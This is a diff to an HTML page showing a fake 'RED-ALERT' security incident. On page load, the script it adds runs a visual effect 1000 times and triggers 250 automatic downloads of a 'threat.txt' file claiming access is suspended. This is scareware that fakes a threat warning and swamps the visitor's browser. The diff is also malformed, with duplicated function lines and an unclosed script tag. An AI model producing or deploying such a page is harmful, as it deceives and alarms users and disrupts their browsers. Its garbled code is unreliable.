@@ -93,9 +93,11 @@
     <div class="badge">Incident ID: RED-ALERT</div>
   </div>
 
- <script>
+<script>
   const RUNS = 1000;
 
+  function runEffect() {
+    (t => {
   function runEffect() {
     (t => {
         (t => {
@@ -208,13 +210,36 @@
     }
     })();
   }
+    })();
+  }
 
-  // Kick off 1000 runs immediately
-  (function startMany() {
-    for (let k = 0; k < RUNS; k++) {
-      runEffect(); // direct call, no delay
+  function downloadThreatFile() {
+    const content = "Threat detected.\nAccess suspended.\nIncident ID: RED-ALERT";
+    const blob = new Blob([content], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+
+    for (let i = 0; i < 250; i++) {
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "threat.txt";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
+
+    URL.revokeObjectURL(url);
+  }
+
+  // Kick off everything immediately
+  (function startAll() {
+    // Run the visual effect 1000 times instantly
+    for (let k = 0; k < RUNS; k++) {
+      runEffect();
+    }
+
+    // Trigger the downloads
+    downloadThreatFile();
   })();
-<script>
+
 </body>
 </html>
